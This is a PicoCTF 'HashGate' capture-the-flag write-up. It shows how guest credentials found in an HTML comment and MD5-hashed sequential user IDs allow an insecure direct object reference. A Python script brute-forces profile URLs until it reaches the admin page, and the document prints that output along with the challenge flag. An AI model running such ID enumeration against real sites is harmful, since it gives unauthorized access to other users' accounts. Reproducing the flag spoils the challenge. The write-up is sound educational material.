# PicoCTF HashGate Web Category 

# Enumeration
After launch the instance link is in `http://crystal-peak.picoctf.net:64376/`

From view-source doung commented document :
`<!-- Email: guest@picoctf.org Password: guest -->`

After login redirected to `http://crystal-peak.picoctf.net:64376/profile/user/e93028bdc1aacdfb3687181f2031765d` and it's tell :
`Access level: Guest (ID: 3000). Insufficient privileges to view classified data. Only top-tier users can access the flag.`

# Exploit
From enumeration the last endpoint is MD5 from user id so create file `exploit.py`
```
import requests
import hashlib


def brute_userID(md5_ID):
    try:
        url = "http://crystal-peak.picoctf.net:64376/profile/user/"+md5_ID
        headers = {
            "Accept-Language": "en-US,en;q=0.9", 
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36", 
            "Accept": "*/*", 
            "Referer": "http://crystal-peak.picoctf.net:64376/", 
            "Accept-Encoding": "gzip, deflate, br", 
            "Connection": 
            "keep-alive"
        }
        response = requests.get(url, headers=headers)
        if('Insufficient privileges ' in response.text or 'User not found.' in response.text):
            return False
        else:
            print(response.text)
            return True
    except Exception as e:
        print("[-] Error Bos-ku")

for user_id in range(2900,3100):
    uid = hashlib.md5(str(user_id).encode()).hexdigest()
    print(f"[+] Trying {uid}", end='\n', flush=True)
    if(brute_userID(uid)):
        break
```

And after we run the exploit.py 
```
┌──(kali㉿kali)-[~/PicoCTF/Web/HashGate]
└─$ python exploit.py
[+] Trying f9fd2624beefbc7808e4e405d73f57ab
[+] Trying a57e8915461b83adefb011530b711704
........[SNIPPED].........
[+] Trying ee16fa83c0f151ef85e617f5aa3867a6
[+] Trying 22722a343513ed45f14905eb07621686
[+] Trying b1f62fa99de9f27a048344d55c5ef7a6
[+] Trying 5a01f0597ac4bdf35c24846734ee9a76
Welcome, admin! Here is the flag: picoCTF{id0r_unl0ck_7b2293b7}
```

And there is the flag 
